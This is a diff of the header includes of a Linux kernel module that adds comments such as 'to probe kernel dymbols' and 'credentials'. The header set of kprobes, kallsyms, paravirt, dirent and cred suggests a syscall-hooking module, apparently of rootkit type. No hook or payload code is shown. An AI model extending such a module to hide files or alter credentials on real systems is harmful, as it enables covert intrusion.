@@ -4,19 +4,17 @@
 #include <linux/kallsyms.h> // functions for kallsyms actions
 #include <linux/unistd.h> // syscalls macros (checks for 32 bit and defines accordinly)
 #include <linux/version.h> // get kernel versions
-#include <linux/kprobes.h>
-//#include <sys/types.h>
+#include <linux/kprobes.h> // to probe kernel dymbols
 #include <asm/paravirt.h>
 #include <linux/dirent.h> // dirent
 #include <linux/slab.h>
-#include <linux/cred.h>
+#include <linux/cred.h> // credentials
 #include <linux/syscalls.h>
-#include <linux/uaccess.h>
+#include <linux/uaccess.h> // copy to/from user space
 #include <linux/fs.h>
-#include <linux/miscdevice.h>
-#include <linux/reboot.h>
+#include <linux/miscdevice.h> // dev
+#include <linux/reboot.h> // reboot function
 #include <linux/sched.h>
-//#include <arch/um/Kconfig> // for CONFIG_X86_64 disable before make
 
 
 MODULE_LICENSE("GPL");
